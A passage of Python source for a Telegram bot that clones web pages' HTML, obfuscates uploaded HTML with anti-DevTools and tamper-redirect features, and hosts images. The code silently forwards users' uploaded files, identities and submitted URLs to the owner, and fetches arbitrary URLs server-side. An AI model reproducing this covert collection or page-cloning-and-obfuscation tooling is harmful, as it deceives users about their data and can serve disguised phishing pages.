# 🔘 CALLBACK QUERY DISPATCHER
# ==============================================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    user_id = str(call.from_user.id if call.from_user else chat_id).strip()
    data = call.data
    bot.answer_callback_query(call.id)

    if data.startswith("admin_"):
        if not is_admin(user_id) and not is_admin(chat_id):
            bot.send_message(chat_id, f"🚫 <b>Access Denied!</b> Your ID is <code>{user_id}</code>.", parse_mode="HTML")
            return

        if data == "admin_menu":
            user_states[chat_id] = ""
            admin_count = len(db.get("admins", [ADMIN_ID]))
            user_count = len(db.get("users", []))
            status_text = "🟢 ONLINE" if db.get("bot_active", True) else "🔴 OFFLINE"
            panel_text = f"""🛡️ <b>𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 (Pʀᴇᴍɪᴜᴍ V6.0)</b> 🛡️

👑 <b>Role:</b> {"👑 Super Owner" if is_owner(user_id) else "🛡️ Sub-Admin"}
• <b>Your ID:</b> <code>{user_id}</code>
• <b>Total Users:</b> <code>{user_count}</code>
• <b>Total Admins:</b> <code>{admin_count}</code>
• <b>Bot Status:</b> {status_text}"""
            safe_edit_message_text(panel_text, chat_id, call.message.message_id, reply_markup=get_admin_panel_markup(), parse_mode="HTML")
            return

        if data == "admin_off":
            db['bot_active'] = False
            save_db(db)
            bot.send_message(chat_id, "🔴 <b>BOT STATUS:</b> OFFLINE", parse_mode="HTML")
            return

        if data == "admin_on":
            db['bot_active'] = True
            save_db(db)
            bot.send_message(chat_id, "🟢 <b>BOT STATUS:</b> ONLINE", parse_mode="HTML")
            return

        if data == "admin_view_users":
            bot.send_message(chat_id, f"👥 <b>Total Registered Users:</b> <code>{len(db['users'])}</code>", parse_mode="HTML")
            return

        if data == "admin_view_logs":
            logs = "\n".join(db['activities'][-15:]) or "No activities yet."
            bot.send_message(chat_id, f"📝 <b>Live Activity Logs:</b>\n\n<code>{logs}</code>", parse_mode="HTML")
            return

        if data == "admin_view_urls":
            urls_log = "\n".join(db.get('saved_urls', [])[-20:]) or "No URLs yet."
            bot.send_message(chat_id, f"🌐 <b>Recent URLs:</b>\n\n{urls_log}", disable_web_page_preview=True, parse_mode="HTML")
            return

        if data == "admin_view_files":
            files = db.get('saved_files', [])
            if not files: 
                bot.send_message(chat_id, "📁 No files recorded yet.")
                return
            for f in files[-8:]:
                if isinstance(f, dict): 
                    bot.send_document(chat_id, f['file_id'], caption=f"• Time: {f['time']}\n• User: <code>{f['uid']}</code>", parse_mode="HTML")
            return

        if data == "admin_manage_admins":
            admins = [str(a).strip() for a in db.get("admins", [ADMIN_ID])]
            text_lines = [
                f"👑 <b>ADMINS MANAGEMENT</b> 👑",
                f"• <b>Total Admins Count:</b> <code>{len(admins)}</code>\n"
            ]
            btn_rows = []
            for idx, a_id in enumerate(admins, start=1):
                is_root = (a_id == str(ADMIN_ID).strip())
                role_label = "👑 Super Owner" if is_root else "🛡️ Admin"
                text_lines.append(f"{idx}. <code>{a_id}</code> ({role_label})")
                if not is_root and is_owner(user_id):
                    btn_rows.append([
                        {"text": f"🗑️ Remove {a_id}", "callback_data": f"admin_del_{a_id}", "style": "danger"}
                    ])
            if is_owner(user_id):
                btn_rows.append([
                    {"text": "➕ Add New Admin", "callback_data": "admin_add_admin_prompt", "style": "success"}
                ])
            btn_rows.append([
                {"text": "🔙 Back to Admin Menu", "callback_data": "admin_menu", "style": "primary"}
            ])
            markup = create_styled_inline_keyboard(btn_rows)
            safe_edit_message_text("\n".join(text_lines), chat_id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
            return

        if data == "admin_add_admin_prompt":
            if not is_owner(user_id):
                bot.send_message(chat_id, "❌ Only the Super Owner can add admins.")
                return
            user_states[chat_id] = "WAIT_ADD_ADMIN_ID"
            cancel_kb = create_styled_inline_keyboard([
                [{"text": "❌ Cancel", "callback_data": "admin_manage_admins", "style": "danger"}]
            ])
            safe_send_message(
                chat_id, 
                "👑 <b>ADD NEW ADMIN:</b>\n\nPlease send the <b>Telegram User ID</b> of the person you want to make an admin:\n\n<i>Example: 1234567890</i>", 
                reply_markup=cancel_kb, 
                parse_mode="HTML"
            )
            return

        if data.startswith("admin_del_"):
            if not is_owner(user_id):
                bot.send_message(chat_id, "❌ Only the Super Owner can remove admins.")
                return
            target_to_remove = data.replace("admin_del_", "").strip()
            admins = [str(a).strip() for a in db.get("admins", [ADMIN_ID])]
            if target_to_remove in admins and target_to_remove != str(ADMIN_ID).strip():
                admins.remove(target_to_remove)
                db["admins"] = admins
                save_db(db)
                bot.send_message(chat_id, f"✅ Admin <code>{target_to_remove}</code> has been removed.", parse_mode="HTML")
            call.data = "admin_manage_admins"
            callback_query(call)
            return

        if data == "admin_broadcast_start":
            user_states[chat_id] = "WAIT_BROADCAST_CONTENT"
            cancel_kb = create_styled_inline_keyboard([
                [{"text": "❌ Cancel Broadcast", "callback_data": "broadcast_cancel", "style": "danger"}]
            ])
            composer_text = """📣 <b>RICH MEDIA BROADCAST COMPOSER</b> 📣

You can broadcast <b>ANY</b> of the following:
• ✍️ <b>Text Message</b> (HTML formatting allowed)
• 📸 <b>Photo</b> (with optional caption)
• 🎥 <b>Video</b> (with optional caption)
• 🏷️ <b>Sticker</b> (Telegram stickers supported!)

👉 <b>Send your message, photo, video, or sticker now!</b>
<i>You will be given a preview with Confirm/Cancel buttons before it is sent to users.</i>"""
            safe_send_message(chat_id, composer_text, reply_markup=cancel_kb, parse_mode="HTML")
            return

        if data == "admin_edit_texts":
            rows = [
                [
                    {"text": "✏️ Welcome Text", "callback_data": "edit_txt_welcome", "style": "primary"},
                    {"text": "✏️ Obfuscate Text", "callback_data": "edit_txt_obf_prompt", "style": "primary"}
                ],
                [
                    {"text": "✏️ URL Prompt", "callback_data": "edit_txt_url_prompt", "style": "primary"},
                    {"text": "✏️ Image Prompt", "callback_data": "edit_txt_img_prompt", "style": "primary"}
                ],
                [
                    {"text": "🔙 Back", "callback_data": "admin_menu"}
                ]
            ]
            safe_send_message(chat_id, "✏️ <b>Select text template to modify:</b>", reply_markup=create_styled_inline_keyboard(rows), parse_mode="HTML")
            return

    if data == "broadcast_confirm":
        if not is_admin(user_id) and not is_admin(chat_id):
            return
        staged = broadcast_staging.get(chat_id)
        if not staged:
            bot.send_message(chat_id, "⚠️ No broadcast queued or broadcast already completed.")
            return
        del broadcast_staging[chat_id]
        broadcast_cancel_flags[chat_id] = False
        total_targets = len(db.get("users", []))
        abort_markup = create_styled_inline_keyboard([
            [{"text": "⏹️ Abort / Stop Broadcast", "callback_data": f"broadcast_abort_{chat_id}", "style": "danger"}]
        ])
        safe_send_message(chat_id, f"🚀 <b>Starting Broadcast to {total_targets} users...</b>", reply_markup=abort_markup, parse_mode="HTML")
        success = 0
        failed = 0
        b_type = staged["type"]
        content = staged["content"]
        caption = staged.get("caption")
        for idx, u in enumerate(db.get("users", [])):
            if broadcast_cancel_flags.get(chat_id, False):
                bot.send_message(chat_id, f"🛑 <b>Broadcast Cancelled by Admin!</b>\nSent: {success} | Skipped: {total_targets - (success + failed)}", parse_mode="HTML")
                break
            try:
                target_uid = int(u)
                if b_type == "text":
                    bot.send_message(target_uid, f"📣 <b>𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘</b> 📣\n\n{content}", parse_mode="HTML")
                elif b_type == "photo":
                    bot.send_photo(target_uid, content, caption=caption or "📣 <b>𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘</b>", parse_mode="HTML")
                elif b_type == "video":
                    bot.send_video(target_uid, content, caption=caption or "📣 <b>𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘</b>", parse_mode="HTML")
                elif b_type == "sticker":
                    bot.send_sticker(target_uid, content)
                success += 1
            except Exception:
                failed += 1
            time.sleep(0.04)
        bot.send_message(
            chat_id, 
            f"✅ <b>Broadcast Completed!</b>\n\n📬 <b>Delivered:</b> <code>{success}</code>\n❌ <b>Failed/Blocked:</b> <code>{failed}</code>\n👥 <b>Total Target:</b> <code>{total_targets}</code>", 
            parse_mode="HTML"
        )
        return

    if data == "broadcast_cancel":
        if chat_id in broadcast_staging:
            del broadcast_staging[chat_id]
        user_states[chat_id] = ""
        bot.send_message(chat_id, "❌ <b>Broadcast has been cancelled.</b>", parse_mode="HTML")
        return

    if data.startswith("broadcast_abort_"):
        admin_owner = data.replace("broadcast_abort_", "")
        broadcast_cancel_flags[int(admin_owner)] = True
        bot.send_message(chat_id, "🛑 <b>Cancelling broadcast immediately...</b>", parse_mode="HTML")
        return

    if data.startswith("edit_txt_"):
        if not is_admin(user_id) and not is_admin(chat_id): return
        target = data.replace("edit_txt_", "")
        user_states[chat_id] = f"WAIT_EDIT_{target}"
        bot.send_message(chat_id, f"✏️ Send new replacement text for <b>{target}</b> (HTML formatting allowed):", parse_mode="HTML")
        return

    if not db['bot_active'] and not is_admin(user_id) and not is_admin(chat_id): return

    if data == "btn_obf":
        user_states[chat_id] = "WAIT_HTML_FILE"
        safe_send_message(chat_id, db["texts"]["obf_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Selected VM Obfuscator")
    elif data == "btn_url":
        user_states[chat_id] = "WAIT_URL"
        safe_send_message(chat_id, db["texts"]["url_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Selected URL to HTML")
    elif data == "btn_img":
        user_states[chat_id] = "WAIT_IMAGE"
        safe_send_message(chat_id, db["texts"]["img_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Selected Image to URL")
    elif data == "btn_stats":
        total_users = len(db['users'])
        obf_count = db['stats']['obf']
        url_count = db['stats']['url']
        img_count = db['stats']['img']
        total_admins = len(db.get("admins", [ADMIN_ID]))
        stats_text = f"""✦ <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs (Pʀᴇᴍɪᴜᴍ Sᴜɪᴛᴇ V6.0)</b> ✦

• <b>Total Registered Users:</b> <code>{total_users}</code>
• <b>Active Administrators:</b> <code>{total_admins}</code>
• <b>VM Bytecode Obfuscations:</b> <code>{obf_count}</code>
• <b>URLs Rendered:</b> <code>{url_count}</code>
• <b>Images Hosted:</b> <code>{img_count}</code>

⌁ <b>VM Engine Status:</b> 5-Layer Protection Active ✅"""
        safe_send_message(chat_id, stats_text, reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Viewed Stats")

# ==============================================================================
# 📤 DOCUMENT HANDLER (VM HTML OBFUSCATION)
# ==============================================================================
def extract_user_info_safe(message):
    name = message.from_user.first_name if message.from_user.first_name else "Unknown"
    uid = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    return f"• Name: {name}\n• ID: <code>{uid}</code>\n• Username: {username}"

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id if message.from_user else chat_id).strip()
    if not db['bot_active'] and not is_admin(user_id):
        bot.reply_to(message, "🛠️ Bot is currently offline.")
        return

    if not is_admin(user_id):
        try:
            info = extract_user_info_safe(message)
            admin_msg = f"⌁ <b>NEW FILE RECEIVED!</b>\n{info}\n📁 File: {message.document.file_name}"
            bot.send_message(int(ADMIN_ID), admin_msg, parse_mode="HTML")
            bot.forward_message(int(ADMIN_ID), chat_id, message.message_id)
        except Exception: 
            pass

    try:
        if not message.document.file_name.endswith('.html'):
            bot.reply_to(message, "⚠️ Error: Please send a valid HTML (.html) file.")
            return
            
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
        db['saved_files'].append({
            "time": time_now, 
            "uid": chat_id, 
            "name": message.document.file_name, 
            "file_id": message.document.file_id
        })
        
        db['stats']['obf'] += 1
        save_db(db)
        
        bot.reply_to(message, "⏳ <b>Processing...</b>\n<b>⌁ 𝙊𝘽𝙁𝙐𝙎𝘾𝘼𝙏𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙃𝙏𝙈𝙇 𝙒𝙄𝙏𝙃 5-𝙇𝘼𝙔𝙀𝙍 𝙑𝙈 𝘽𝙔𝙏𝙀𝘾𝙊𝘿𝙀 𝙀𝙉𝙂𝙄𝙉𝙀 𝙑6.0 ✦</b>", parse_mode="HTML")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        html_content = downloaded_file.decode('utf-8', errors='ignore')
        
        obfuscated_content = vm_compile_html(html_content)
        obfuscated_file = io.BytesIO(obfuscated_content.encode('utf-8'))
        obfuscated_file_name = "SHADOW_OBF.html"
        obfuscated_file.name = obfuscated_file_name
        
        custom_caption = """🛡️ 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗲𝗱 𝘄𝗶𝘁𝗵:
  • 🔍 DevTools Detection
  • 🛡️ Anti-Scraping
  • 🖼️ Iframe/Sandbox Detection
  • 🎨 VM Obfuscation Engine
  • 🌐 Pro Obfuscation


POWER BY:- @SIYAM_BHAI_OWNER

⚠️ Disclaimer: This bot only obfuscates JavaScript (JS) code. HTML and CSS are wrapped together inside a secure single-script output file."""
        
        bot.send_document(
            chat_id, 
            obfuscated_file, 
            caption=custom_caption, 
            reply_markup=get_main_reply_keyboard(), 
            parse_mode="HTML", 
            timeout=120
        )
        log_activity(chat_id, f"Encrypted file: {message.document.file_name}")
        user_states[chat_id] = "" 
    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error: ({str(e)})")

# ==============================================================================
# 📸 PHOTO / STICKER / VIDEO HANDLERS
# ==============================================================================
def present_broadcast_preview(chat_id, b_type, content, caption=None):
    broadcast_staging[chat_id] = {
        "type": b_type,
        "content": content,
        "caption": caption
    }
    user_states[chat_id] = ""
    
    markup = create_styled_inline_keyboard([
        [
            {"text": "✅ Confirm & Send", "callback_data": "broadcast_confirm", "style": "success"},
            {"text": "❌ Cancel Broadcast", "callback_data": "broadcast_cancel", "style": "danger"}
        ],
        [
            {"text": "⚙️ Admin Settings", "callback_data": "admin_menu", "style": "primary"}
        ]
    ])
    
    preview_msg = f"📣 <b>BROADCAST PREVIEW ({b_type.upper()})</b>\n\nTarget Users: <code>{len(db.get('users', []))}</code>\n\n<i>Review the media above and tap Confirm to broadcast or Cancel to abort:</i>"
    safe_send_message(chat_id, preview_msg, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(content_types=['sticker'])
def handle_sticker(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id if message.from_user else chat_id).strip()
    state = user_states.get(chat_id, "")
    
    if is_admin(user_id) and state == "WAIT_BROADCAST_CONTENT":
        sticker_id = message.sticker.file_id
        bot.reply_to(message, "🏷️ <b>Sticker captured for broadcast!</b>", parse_mode="HTML")
        present_broadcast_preview(chat_id, "sticker", sticker_id)
        return

@bot.message_handler(content_types=['video'])
def handle_video(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id if message.from_user else chat_id).strip()
    state = user_states.get(chat_id, "")
    
    if is_admin(user_id) and state == "WAIT_BROADCAST_CONTENT":
        video_id = message.video.file_id
        caption = message.caption or ""
        bot.reply_to(message, "🎥 <b>Video captured for broadcast!</b>", parse_mode="HTML")
        present_broadcast_preview(chat_id, "video", video_id, caption)
        return

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id if message.from_user else chat_id).strip()
    state = user_states.get(chat_id, "")
    
    if is_admin(user_id) and state == "WAIT_BROADCAST_CONTENT":
        photo_id = message.photo[-1].file_id
        caption = message.caption or ""
        bot.reply_to(message, "📸 <b>Photo captured for broadcast!</b>", parse_mode="HTML")
        present_broadcast_preview(chat_id, "photo", photo_id, caption)
        return

    if not db['bot_active'] and not is_admin(user_id):
        bot.reply_to(message, "🛠️ Bot is currently offline.")
        return

    try:
        bot.reply_to(message, "⏳ <b>𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗜𝗺𝗮𝗴𝗲...</b>", parse_mode="HTML")
        
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        image_url = None
        if IMGBB_API_KEY and IMGBB_API_KEY != "YOUR_IMGBB_API_KEY_HERE":
            try:
                response = requests.post(
                    f"https://api.imgbb.com/1/upload?key={IMGBB_API_KEY}", 
                    files={"image": downloaded_file},
                    timeout=20
                )
                res_data = response.json()
                if response.status_code == 200 and res_data.get("success"):
                    image_url = res_data["data"]["url"]
            except Exception:
                pass

        if not image_url:
            response = requests.post(
                "https://catbox.moe/user/api.php", 
                data={"reqtype": "fileupload"}, 
                files={"fileToUpload": ("image.jpg", downloaded_file, "image/jpeg")},
                timeout=25
            )
            if response.status_code == 200 and response.text.startswith("http"):
                image_url = response.text.strip()
            else:
                bot.reply_to(message, "❌ <b>Failed to upload image to CDN.</b>", parse_mode="HTML")
                return
                
        name = message.from_user.first_name if message.from_user.first_name else "Unknown"
        
        db['stats']['img'] += 1
        save_db(db)
        
        success_text = f"✅ <b>Lɪɴᴋ Gᴇɴᴇʀᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n\n• <b>Nᴀᴍᴇ:</b> {name}\n• <b>ID:</b> <code>{chat_id}</code>\n\n➔ <b>Yᴏᴜʀ Dɪʀᴇᴄᴛ Lɪɴᴋ:</b>\n{image_url}"
        bot.reply_to(message, success_text, reply_markup=get_main_reply_keyboard(), disable_web_page_preview=False, parse_mode="HTML")
        log_activity(chat_id, "Generated Image URL")
        user_states[chat_id] = ""
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==============================================================================
# 💬 TEXT MESSAGE DISPATCHER
# ==============================================================================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id if message.from_user else chat_id).strip()
    state = user_states.get(chat_id, "")
    text = (message.text or "").strip()

    if is_owner(user_id) and state == "WAIT_ADD_ADMIN_ID":
        if not text.isdigit():
            bot.reply_to(message, "❌ Invalid ID! Telegram ID must be digits only. Please re-enter or /admin to exit.")
            return
        admins = [str(a).strip() for a in db.get("admins", [ADMIN_ID])]
        if text in admins:
            bot.reply_to(message, f"ℹ️ User <code>{text}</code> is already an admin.", parse_mode="HTML")
        else:
            admins.append(text)
            db["admins"] = admins
            save_db(db)
            bot.reply_to(message, f"✅ <b>Admin Added Successfully!</b>\n• ID: <code>{text}</code>\n• Total Admins: <b>{len(admins)}</b>", parse_mode="HTML")
        user_states[chat_id] = ""
        return

    if is_admin(user_id) and state.startswith("WAIT_EDIT_"):
        target = state.replace("WAIT_EDIT_", "")
        db["texts"][target] = message.text
        save_db(db)
        bot.reply_to(message, f"✅ Text template for <b>{target}</b> updated successfully!", parse_mode="HTML")
        user_states[chat_id] = ""
        return

    if is_admin(user_id) and state == "WAIT_BROADCAST_CONTENT":
        present_broadcast_preview(chat_id, "text", message.text)
        return

    if not db['bot_active'] and not is_admin(user_id):
        bot.reply_to(message, "🛠️ Bot is currently offline.")
        return

    if "Render URL" in text or text == "🌐 Render URL":
        user_states[chat_id] = "WAIT_URL"
        bot.send_message(chat_id, db["texts"]["url_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Clicked URL to HTML via Reply Keyboard")
        return

    if "Obfuscate HTML" in text or text == "🔒 Obfuscate HTML":
        user_states[chat_id] = "WAIT_HTML_FILE"
        bot.send_message(chat_id, db["texts"]["obf_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Clicked Obfuscate HTML via Reply Keyboard")
        return

    if "Image to URL" in text or text == "📸 Image to URL":
        user_states[chat_id] = "WAIT_IMAGE"
        bot.send_message(chat_id, db["texts"]["img_prompt"], reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Clicked Image to URL via Reply Keyboard")
        return

    if "Stats" in text or text == "📊 Stats":
        total_users = len(db['users'])
        obf_count = db['stats']['obf']
        url_count = db['stats']['url']
        img_count = db['stats']['img']
        total_admins = len(db.get("admins", [ADMIN_ID]))
        stats_text = f"✦ <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs (Pʀᴇᴍɪᴜᴍ Sᴜɪᴛᴇ V6.0)</b> ✦\n\n• <b>Total Users:</b> <code>{total_users}</code>\n• <b>Total Admins:</b> <code>{total_admins}</code>\n• <b>VM Obfuscations:</b> <code>{obf_count}</code>\n• <b>URLs Rendered:</b> <code>{url_count}</code>\n• <b>Images Converted:</b> <code>{img_count}</code>\n\n⌁ <i>Engine Status: 5-Layer Protection Active ✅</i>"
        bot.send_message(chat_id, stats_text, reply_markup=get_main_reply_keyboard(), parse_mode="HTML")
        log_activity(chat_id, "Viewed Stats via Reply Keyboard")
        return

    if state == "WAIT_URL" or text.startswith("http://") or text.startswith("https://") or ('.' in text and not ' ' in text and len(text) > 4):
        url = text
        if not url.startswith("http"): url = "https://" + url
            
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
        db['saved_urls'].append(f"[{time_now}] UID: {chat_id} -> {url}")
        
        db['stats']['url'] += 1
        save_db(db)

        if not is_admin(user_id):
            try:
                info = extract_user_info_safe(message)
                admin_msg = f"⌁ <b>NEW URL RECEIVED!</b>\n{info}\n• URL: {url}"
                bot.send_message(int(ADMIN_ID), admin_msg, parse_mode="HTML")
            except Exception: pass
        
        try:
            bot.reply_to(message, "⏳ <b>𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗙𝘂𝗹𝗹 𝗛𝗧𝗠𝗟 & 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁...</b>", parse_mode="HTML")
            
            try:
                screenshot_url = f"https://image.thum.io/get/width/1200/crop/800/noanimate/{url}"
                bot.send_photo(chat_id, screenshot_url, caption=f"📸 <b>Lɪᴠᴇ Sᴄʀᴇᴇɴsʜᴏᴛ ᴏғ:</b> {url}", parse_mode="HTML")
            except Exception:
                pass

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Upgrade-Insecure-Requests': '1'
            }
            response = requests.get(url, headers=headers, timeout=20)
            response.raise_for_status() 
            
            html_file = io.BytesIO(response.content)
            domain = url.split("//")[-1].split("/")[0]
            html_file.name = "SHADOW URL.html"
            
            caption = f"✅ <b>HTML EXTRACTION COMPLETE!</b>\n\n⌁ <b>Extracted Details:</b>\n• Live URL: {url}\n• Clean HTML Source Code\n• Fast Server Fetch\n• Anti-Block User-Agent\n\n📁 <i>File: SHADOW URL.html</i>"
            bot.send_document(chat_id, html_file, caption=caption, reply_markup=get_main_reply_keyboard(), parse_mode="HTML", timeout=120)
            log_activity(chat_id, f"Fetched URL: {domain}")
            user_states[chat_id] = "" 
            return
        except Exception as err:
            bot.reply_to(message, f"❌ Failed to extract URL: ({str(err)})")
            return
        
    bot.reply_to(
        message, 
        "⌁ <b>Please select an action from the keyboard below:</b>", 
        reply_markup=get_main_reply_keyboard(), 
        parse_mode="HTML"
    )

# ==============================================================================
# 🌐 24/7 WEB SERVER KEEP-ALIVE
# ==============================================================================
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json; charset=utf-8')
        self.end_headers()
        response = {
            "status": "online",
            "suite": "Telegram Bot Suite V6.0",
            "vm_engine": "5-layer-active",
            "redirect_guard": "armed",
            "redirect_target": REDIRECT_TARGET,
            "admins_count": len(db.get("admins", [ADMIN_ID])),
            "timestamp": datetime.now().isoformat()
        }
        self.wfile.write(json.dumps(response, indent=2).encode('utf-8'))
    
    def log_message(self, format, *args):
        pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

if __name__ == '__main__':
    print("✦ PREMIUM TELEGRAM BOT SUITE V6.0 INITIALIZING...")
    print("🧬 5-LAYER HARDENED VM BYTECODE OBFUSCATION ENGINE: ACTIVE")
    print(f"🚨 TAMPER REDIRECT GUARD: ARMED → {REDIRECT_TARGET}")
    print("👑 MULTI-ADMIN & BROADCAST MEDIA ENGINE: READY")
    print("🎨 TELEGRAM 8.0+ COLORED BUTTON SYSTEM: ENABLED")
    
    threading.Thread(target=run_web_server, daemon=True).start()
    bot.infinity_polling(skip_pending=True)